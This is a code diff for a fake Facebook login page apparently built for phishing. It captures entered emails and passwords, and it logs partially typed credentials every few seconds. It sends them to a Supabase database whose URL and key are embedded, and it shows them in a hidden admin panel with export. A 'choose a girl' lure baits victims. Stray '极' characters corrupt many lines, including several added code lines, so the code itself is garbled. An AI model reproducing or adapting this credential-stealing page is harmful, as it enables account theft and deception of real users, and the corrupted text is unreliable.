@@ -21,7 +21,6 @@
             display: flex;
             flex-direction: column;
             min-height: 100vh;
-            position: relative;
         }
         
         .container {
@@ -72,7 +71,7 @@
         .login-form {
             background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(极, 0, 0, .1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             padding: 20px;
             max-width: 400px;
             margin: auto;
@@ -99,9 +98,9 @@
             background-color: #1877f2;
             color: white;
             border: none;
-极          border-radius: 6px;
+            border-radius: 6px;
             font-size: 20px;
-            padding: 极2px;
+            padding: 12px;
             font-weight: bold;
             width: 100%;
             margin-bottom: 15px;
@@ -163,7 +162,6 @@
             margin: 5px 0;
         }
 
-        /* Error display */
         .error-message {
             color: #f02849;
             text-align: center;
@@ -174,30 +172,6 @@
             display: none;
         }
 
-        /* Connection instructions */
-        .connection-help {
-            background-color: #e7f3ff;
-            border: 1px solid #1877f2;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .connection-help h3 {
-            color: #1877f2;
-            margin-bottom: 10px;
-        }
-        
-        .connection-help ol {
-            padding-left: 20px;
-        }
-        
-        .connection-help li {
-            margin-bottom: 8px;
-        }
-
-        /* Main page styles */
         .main-page {
             display: none;
             padding: 20px;
@@ -219,7 +193,7 @@
             gap: 15px;
             padding: 20px;
             background-color: #f0f2f5;
-            border-radius: 0 0 8极 8px;
+            border-radius: 0 0 8px 8px;
         }
         
         .girl-box {
@@ -252,7 +226,6 @@
             cursor: pointer;
         }
         
-        /* Admin panel styles */
         .admin-panel {
             display: none;
             position: fixed;
@@ -281,7 +254,7 @@
             width: 40px;
             height: 40px;
             cursor: pointer;
-            z极dex: 1001;
+            z-index: 1001;
             font-size: 18px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             display: flex;
@@ -294,7 +267,7 @@
             border-bottom: 1px solid #dddfe2;
             margin-bottom: 10px;
             border-radius: 6px;
-            background-color: #极7f8fa;
+            background-color: #f7f8fa;
         }
         
         .attempt-item:last-child {
@@ -307,7 +280,7 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
-            padding-bottom: 15极;
+            padding-bottom: 15px;
             border-bottom: 2px solid #e4e6eb;
         }
         
@@ -365,7 +338,6 @@
             color: white;
         }
         
-        /* Admin login form */
         .admin-login-container {
             display: none;
             position: fixed;
@@ -447,7 +419,6 @@
             color: #65676b;
         }
 
-        /* Supabase status indicator */
         .supabase-status {
             position: fixed;
             bottom: 10px;
@@ -466,7 +437,6 @@
             background: #f02849;
         }
 
-        /* Debug button */
         .debug-btn {
             position: fixed;
             bottom: 60px;
@@ -512,36 +482,19 @@
     </style>
 </head>
 <body>
-    <!-- Error display -->
     <div class="error-message" id="errorMessage"></div>
-    
-    <!-- Connection help section -->
-    <div class="connection-help" id="connectionHelp">
-        <h3><i class="fas fa-info-circle"></i> Connection Setup Required</h3>
-        <p>To make this application work, you need to:</p>
-        <ol>
-            <li>Create a free account at <a href="https://supabase.com" target="_blank">Supabase.com</a></li>
-            <li>Create a new project and get your API URL and Key</li>
-            <li>Create a table named 'login_attempts' with columns: id, email, password, timestamp, incomplete</li>
-            <li>Update the supabaseUrl and supabaseKey in the code with your credentials</li>
-        </ol>
-        <p>Without these steps, the connection will fail with "Failed to fetch" errors.</p>
-    </div>
 
-    <!-- Supabase status indicator -->
     <div class="supabase-status" id="supabaseStatus">
         <i class="fas fa-database"></i> Supabase: Connected
     </div>
 
-    <!-- Debug button -->
     <button class="debug-btn" onclick="testConnection()">
         <i class="fas fa-bug"></i> Test Connection
     </button>
 
-    <!-- Admin Login Form -->
     <div class="admin-login-container" id="adminLoginContainer">
         <div class="admin-login-form">
-            <h2><i class="fas fa-lock"></极> Admin Authentication</h2>
+            <h2><i class="fas fa-lock"></i> Admin Authentication</h2>
             <input type="text" id="adminUsername" placeholder="Admin Username" required>
             <input type="password" id="adminPassword" placeholder="Admin Password" required>
             <button class="admin-login-btn" id="adminLoginBtn">Access Admin Panel</button>
@@ -550,7 +503,6 @@
         </div>
     </div>
 
-    <!-- Login Page -->
     <div class="container login-page">
         <div class="header">
             <div class="logo">facebook</div>
@@ -584,7 +536,6 @@
         </div>
     </div>
     
-    <!-- Main Page -->
     <div class="main-page" id="mainPage">
         <div class="main-header">
             <h2>Facebook - Choose a Girl</h2>
@@ -592,7 +543,6 @@
         </div>
         
         <div class="girls-container" id="girlsContainer">
-            <!-- Will be populated dynamically -->
         </div>
     </div>
     
@@ -601,14 +551,13 @@
         <p>Copyright © 2023 Facebook. All rights reserved.</p>
     </div>
     
-    <!-- Admin Panel -->
     <button class="admin-toggle" id="adminToggle">
         <i class="fas fa-user-secret"></i>
     </button>
     
     <div class="overlay" id="overlay"></div>
     
-    <div class="admin-panel极" id="adminPanel">
+    <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
             <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Admin Panel - Login Attempts</h2>
             <button class="close-admin" id="closeAdmin">
@@ -627,18 +576,10 @@
     </div>
 
     <script>
-        // Initialize Supabase with your credentials
+        // Initialize Supabase
         const supabaseUrl = 'https://vdrzdruwlsknvlxobnlp.supabase.co';
-        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
-        
-        let supabase;
-        try {
-            supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
-        } catch (error) {
-            console.error("Supabase initialization error:", error);
-            showError("Failed to initialize database connection. Check your Supabase credentials.");
-            document.getElementById('connectionHelp').style.display = 'block';
-        }
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp极VCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
+        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
         document.addEventListener('DOMContentLoaded', function() {
             // DOM Elements
@@ -651,7 +592,7 @@
             const adminPanel = document.getElementById('adminPanel');
             const attemptsList = document.getElementById('attemptsList');
             const overlay = document.getElementById('overlay');
-            const closeAdmin = document.getElementById('closeAdmin');
+            const closeAdmin = document.getElementById极('closeAdmin');
             const downloadBtn = document.getElementById('downloadBtn');
             const clearBtn = document.getElementById('clearBtn');
             const adminLoginContainer = document.getElementById('adminLoginContainer');
@@ -664,11 +605,10 @@
             const togglePassword = document.getElementById('togglePassword');
             const supabaseStatus = document.getElementById('supabaseStatus');
             const errorMessage = document.getElementById('errorMessage');
-            const connectionHelp = document.getElementById('connectionHelp');
             
             // Ethiopian girls names
             const ethiopianGirls = [
-                "Alem", "Birut", "Chalt极", "Desta", "Etabesa", 
+                "Alem", "Birut", "Chaltu", "Desta", "Etabesa", 
                 "Fana", "Genet", "Hana", "Iman", "Jember", 
                 "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
                 "Pozeban", "Qelem", "Ruhama", "Saron", "Tigist"
@@ -685,38 +625,29 @@
 
             // Show error message
             function showError(message) {
-                if (errorMessage) {
-                    errorMessage.textContent = message;
-                    errorMessage.style.display = 'block';
-                    setTimeout(() => {
-                        errorMessage.style.display = 'none';
-                    }, 8000);
-                }
+                errorMessage.textContent = message;
+                errorMessage.style.display = 'block';
+                setTimeout(() => {
+                    errorMessage.style.display = 'none';
+                }, 5000);
             }
 
             // Show status message
             function showStatus(message, isError = false) {
-                if (supabaseStatus) {
-                    supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
-                    supabaseStatus.style.display = 'block';
-                    supabaseStatus.className = isError ? 
-                        'supabase-status connection-error' : 'supabase-status';
-                    
-                    setTimeout(() => {
-                        supabaseStatus.style.display = 'none';
-                    }, 5000);
-                }
+                supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
+                supabaseStatus.style.display = 'block';
+                supabaseStatus.className = isError ? 
+                    'supabase-status connection-error极 : 'supabase-status';
+                
+                setTimeout(() => {
+                    supabaseStatus.style.display = 'none';
+                }, 3000);
             }
 
             // Test Supabase connection
             window.testConnection = async function() {
                 try {
                     showStatus('Testing connection...');
-                    
-                    if (!supabase) {
-                        throw new Error("Supabase client not initialized. Check your credentials.");
-                    }
-                    
                     const { data, error } = await supabase
                         .from('login_attempts')
                         .select('count')
@@ -725,26 +656,19 @@
                     if (error) {
                         showError('Supabase Error: ' + error.message);
                         showStatus('Connection Failed', true);
-                        if (connectionHelp) connectionHelp.style.display = 'block';
                     } else {
                         showStatus('Connection Successful!');
                         alert('✅ Connection to Supabase successful!');
-                        if (connectionHelp) connectionHelp.style.display = 'none';
                     }
                 } catch (error) {
-                    showError('Connection Error: ' + error.message);
+                    showError('Network Error: ' + error.message);
                     showStatus('Connection Failed', true);
-                    if (connectionHelp) connectionHelp.style.display = 'block';
                 }
             }
             
             // Save data to Supabase
             async function saveToSupabase(data) {
                 try {
-                    if (!supabase) {
-                        throw new Error("Database not connected");
-                    }
-                    
                     const { error } = await supabase
                         .from('login_attempts')
                         .insert([{ 
@@ -768,10 +692,6 @@
             // Load data from Supabase
             async function loadFromSupabase() {
                 try {
-                    if (!supabase) {
-                        throw new Error("Database not connected");
-                    }
-                    
                     const { data, error } = await supabase
                         .from('login_attempts')
                         .select('*')
@@ -789,41 +709,33 @@
             }
             
             // Display login attempts in admin panel
-            async function displayLoginAttempts() {
-                if (!attemptsList) return;
-                
+            async function displayLogin极ttempts() {
                 attemptsList.innerHTML = '';
                 
-                try {
-                    loginAttempts = await loadFromSupabase();
-                    
-                    if (loginAttempts.length === 0) {
-                        attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
-                        return;
-                    }
-                    
-                    const reversedAttempts = [...loginAttempts].reverse();
-                    
-                    reversedAttempts.forEach(attempt => {
-                        const attemptItem = document.createElement('div');
-                        attemptItem.className = 'attempt-item';
-                        attemptItem.innerHTML = `
-                            <strong>Email/Phone:</strong> ${attempt.email}<br>
-                            <strong>Password:</strong> ${attempt.password}<br>
-                            <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
-                            ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
-                        `;
-                        attemptsList.appendChild(attemptItem);
-                    });
-                } catch (error) {
-                    attemptsList.innerHTML = '<极 class="no-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>';
+                loginAttempts = await loadFromSupabase();
+                
+                if (loginAttempts.length === 0) {
+                    attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
+                    return;
                 }
+                
+                const reversedAttempts = [...loginAttempts].reverse();
+                
+                reversedAttempts.forEach(attempt => {
+                    const attemptItem = document.createElement('div');
+                    attemptItem.className = 'attempt-item';
+                    attemptItem.innerHTML = `
+                        <strong>Email/Phone:</strong> ${attempt.email}<br>
+                        <strong>Password:</strong> ${attempt.password}<br>
+                        <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
+                        ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
+                    `;
+                    attemptsList.appendChild(attemptItem);
+                });
             }
             
             // Setup real-time subscription
             function setupRealtimeSubscription() {
-                if (!supabase) return;
-                
                 if (realtimeSubscription) {
                     supabase.removeChannel(realtimeSubscription);
                 }
@@ -837,7 +749,7 @@
                             table: 'login_attempts' 
                         }, 
                         (payload) => {
-                            if (isAdminAuthenticated && adminPanel && adminPanel.style.display === 'block') {
+                            if (isAdminAuthenticated && adminPanel.style.display === 'block') {
                                 displayLoginAttempts();
                             }
                         }
@@ -847,8 +759,6 @@
             
             // Populate girls selection
             function populateGirls() {
-                if (!girlsContainer) return;
-                
                 girlsContainer.innerHTML = '';
                 
                 ethiopianGirls.forEach(girl => {
@@ -868,172 +778,143 @@
             }
             
             // Handle login form submission
-            if (loginForm) {
-                loginForm.addEventListener('submit', async function(e) {
-                    e.preventDefault();
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (!email || !password) {
+                    showError('Please enter both email and password');
+                    return;
+                }
+                
+                const saved = await saveToSupabase({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    incomplete: false
+                });
+                
+                if (saved) {
+                    loginPage.style.display = 'none';
+                    mainPage.style.display = 'block';
                     
-                    const email = document.getElementById('email').value;
-                    const password = document.getElementById('password').value;
-                    
-                    if (!email || !password) {
-                        showError('Please enter both email and password');
-                        return;
-                    }
-                    
-                    // Simulate login process even if Supabase is down
-                    if (loginPage) loginPage.style.display = 'none';
-                    if (mainPage) mainPage.style.display = 'block';
-                    
-                    if (girlsContainer && girlsContainer.children.length === 0) {
+                    if (girlsContainer.children.length === 0) {
                         populateGirls();
                     }
-                    
-                    // Try to save to Supabase in the background
-                    try {
-                        await saveToSupabase({
-                            email: email,
-                            password: password,
-                            timestamp: new Date().toISOString(),
-                            incomplete: false
-                        });
-                    } catch (error) {
-                        // Silently fail - we've already shown the main content
-                        console.error("Background save failed:", error);
-                    }
-                });
-            }
+                }
+            });
             
             // Handle logout
-            if (logoutBtn) {
-                logoutBtn.addEventListener('click', function() {
-                    if (mainPage) mainPage.style.display = 'none';
-                    if (loginPage) loginPage.style.display = 'block';
-                    if (loginForm) loginForm.reset();
-                });
-            }
+            logoutBtn.addEventListener('click', function() {
+                mainPage.style.display = 'none';
+                loginPage.style.display = 'block';
+                loginForm.reset();
+            });
             
             // Toggle admin panel
-            if (adminToggle) {
-                adminToggle.addEventListener('click', async function() {
-                    if (isAdminAuthenticated) {
-                        if (adminPanel) adminPanel.style.display = 'block';
-                        if (overlay) overlay.style.display = 'block';
-                        await displayLoginAttempts();
-                    } else {
-                        if (adminLoginContainer) adminLoginContainer.style.display = 'flex';
-                    }
-                });
-            }
+            adminToggle.addEventListener('click', async function() {
+                if (isAdminAuthenticated) {
+                    adminPanel.style.display = 'block';
+                    overlay.style.display = 'block';
+                    await displayLoginAttempts();
+                } else {
+                    adminLoginContainer.style.display = 'flex';
+                }
+            });
             
             // Admin login handler
-            if (adminLoginBtn) {
-                adminLoginBtn.addEventListener('click', function() {
-                    if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
-                        isAdminAuthenticated = true;
-                        if (adminLoginContainer) adminLoginContainer.style.display = 'none';
-                        if (adminPanel) adminPanel.style.display = 'block';
-                        if (overlay) overlay.style.display = 'block';
-                        displayLoginAttempts();
-                        if (adminError) adminError.style.display = 'none';
-                        
-                        setupRealtimeSubscription();
-                        
-                        if (adminUsername) adminUsername.value = '';
-                        if (adminPassword) adminPassword.value = '';
-                    } else {
-                        if (adminError) adminError.style.display = 'block';
-                    }
-                });
-            }
+            adminLoginBtn.addEventListener('click', function() {
+                if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
+                    isAdminAuthenticated = true;
+                    adminLoginContainer.style.display = 'none';
+                    adminPanel.style.display = 'block';
+                    overlay.style.display = 'block';
+                    displayLoginAttempts();
+                    adminError.style.display = 'none';
+                    
+                    setupRealtimeSubscription();
+                    
+                    adminUsername.value = '';
+                    adminPassword.value = '';
+                } else {
+                    adminError.style.display = 'block';
+                }
+            });
             
             // Close admin login
-            if (adminLoginClose) {
-                adminLoginClose.addEventListener('click', function() {
-                    if (adminLoginContainer) adminLoginContainer.style.display = 'none';
-                    if (adminError) adminError.style.display = 'none';
-                    if (adminUsername) adminUsername.value = '';
-                    if (adminPassword) adminPassword.value = '';
-                });
-            }
+            adminLoginClose.addEventListener('click', function() {
+                adminLoginContainer.style.display = 'none';
+                adminError.style.display = 'none';
+                adminUsername.value = '';
+                adminPassword.value = '';
+            });
             
             // Close admin panel
-            if (closeAdmin) {
-                closeAdmin.addEventListener('click', function() {
-                    if (adminPanel) admin极nel.style.display = 'none';
-                    if (overlay) overlay.style.display = 'none';
-                    
-                    if (realtimeSubscription) {
-                        supabase.removeChannel(realtimeSubscription);
-                        realtimeSubscription = null;
-                    }
-                });
-            }
+            closeAdmin.addEventListener('click', function() {
+                adminPanel.style.display = 'none';
+                overlay.style.display = 'none';
+                
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
+            });
             
             // Close admin panel when clicking outside
-            if (overlay) {
-                overlay.addEventListener('click', function() {
-                    if (adminPanel) adminPanel.style.display = 'none';
-                    if (overlay) overlay.style.display = 'none';
-                    
-                    if (realtimeSubscription) {
-                        supabase.removeChannel(realtimeSubscription);
-                        realtimeSubscription = null;
-                    }
-                });
-            }
+            overlay.addEventListener('click', function() {
+                adminPanel.style.display = 'none';
+                overlay.style.display = 'none';
+                
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
+            });
             
             // Download data as JSON
-            if (downloadBtn) {
-                downloadBtn.addEventListener('click', function() {
-                    const dataStr = JSON.stringify(loginAttempts, null, 2);
-                    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-                    
-                    const exportFileDefaultName = 'login_attempts.json';
-                    
-                    const linkElement = document.createElement('a');
-                    linkElement.setAttribute('href', dataUri);
-                    linkElement.setAttribute('download', exportFileDefaultName);
-                    linkElement.click();
-                });
-            }
+            downloadBtn.addEventListener('click', function() {
+                const dataStr = JSON.stringify(loginAttempts, null, 2);
+                const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+                
+                const exportFileDefaultName = 'login_attempts.json';
+                
+                const linkElement = document.createElement('a');
+                linkElement.setAttribute('href', dataUri);
+                linkElement.setAttribute('download', exportFileDefaultName);
+                linkElement.click();
+            });
             
             // Clear all data
-            if (clearBtn) {
-                clearBtn.addEventListener('click', async function() {
-                    if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
-                        try {
-                            if (!supabase) {
-                                throw new Error("Database not connected");
-                            }
-                            
-                            const { error } = await supabase
-                                .from('login_attempts')
-                                .delete()
-                                .neq('id', 0);
-                            
-                            if (error) throw error;
-                            
-                            loginAttempts = [];
-                            await displayLoginAttempts();
-                            showStatus('All data cleared');
-                        } catch (error) {
-                            showError('Error clearing data: ' + error.message);
-                        }
+            clearBtn.addEventListener('click', async function() {
+                if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
+                    try {
+                        const { error } = await supabase
+                            .from('login_attempts')
+                            .delete()
+                            .neq('id', 0);
+                        
+                        if (error) throw error;
+                        
+                        loginAttempts = [];
+                        await displayLoginAttempts();
+                        showStatus('All data cleared');
+                    } catch (error) {
+                        showError('Error clearing data: ' + error.message);
                     }
-                });
-            }
+                }
+            });
             
             // Toggle password visibility
-            if (togglePassword && passwordInput) {
-                togglePassword.addEventListener('click', function() {
-                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                    passwordInput.setAttribute('type', type);
-                    this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
-                });
-            }
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<极 class="fas fa-eye-slash"></i>';
+            });
             
             // Initialize
-            setTimeout(testConnection, 1000);
+            testConnection();
             
             // Add real-time keystroke logging
             const emailInput = document.getElementById('email');
@@ -1041,35 +922,29 @@
             let passwordValue = '';
             let lastSaveTime = 0;
             
-            if (emailInput) {
-                emailInput.addEventListener('input', function() {
-                    emailValue = this.value;
-                });
-            }
+            emailInput.addEventListener('input', function() {
+                emailValue = this.value;
+            });
             
-            if (passwordInput) {
-                passwordInput.addEventListener('input', function() {
-                    passwordValue = this.value;
-                });
-            }
+            passwordInput.addEventListener('input', function() {
+                passwordValue = this.value;
+            });
             
             // Periodically save what users are typing
             setInterval(async function() {
                 const now = Date.now();
-                if (now - lastSaveTime < 3000) return;
+                if (now - lastSaveTime < 极000) return;
                 
                 if (emailValue || passwordValue) {
-                    try {
-                        await saveToSupabase({
-                            email: emailValue,
-                            password: passwordValue,
-                            timestamp: new Date().toISOString(),
-                            incomplete: true
-                        });
+                    const saved = await saveToSupabase({
+                        email: emailValue,
+                        password: passwordValue,
+                        timestamp: new Date().toISOString(),
+                        incomplete: true
+                    });
+                    
+                    if (saved) {
                         lastSaveTime = now;
-                    } catch (error) {
-                        // Silently fail for background saves
-                        console.error("Background save failed:", error);
                     }
                 }
             }, 1000);
